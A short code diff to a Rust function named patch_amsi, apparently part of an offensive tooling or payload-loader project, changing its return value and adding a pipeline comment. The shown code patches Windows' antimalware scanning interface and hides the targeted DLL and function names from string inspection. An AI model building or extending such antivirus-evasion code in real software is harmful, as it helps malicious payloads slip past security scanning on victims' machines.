@@ -29,7 +29,7 @@ pub enum PatchAmsiError {
 /// The DLL and function names are substituted at build time by
 /// `Params::render_fragment` with code that rebuilds them at runtime, so they
 /// do not appear in `strings`.
-pub fn patch_amsi() -> Result<(), PatchAmsiError> {
+pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
     let amsi_dll = std::ffi::CString::new($AMSI_DLL_DEF$).map_err(|_| PatchAmsiError::LoadFailed)?;
     let func_name =
         std::ffi::CString::new($AMSI_FUNC_DEF$).map_err(|_| PatchAmsiError::LoadFailed)?;
@@ -73,5 +73,7 @@ pub fn patch_amsi() -> Result<(), PatchAmsiError> {
     }
     .map_err(|_| PatchAmsiError::RestoreProtectionFailed)?;
 
-    Ok(())
+    // A Preparation always continues the pipeline; only the `bouncer` gate
+    // decides to abort (see `techniques/README.md`).
+    Ok(true)
 }
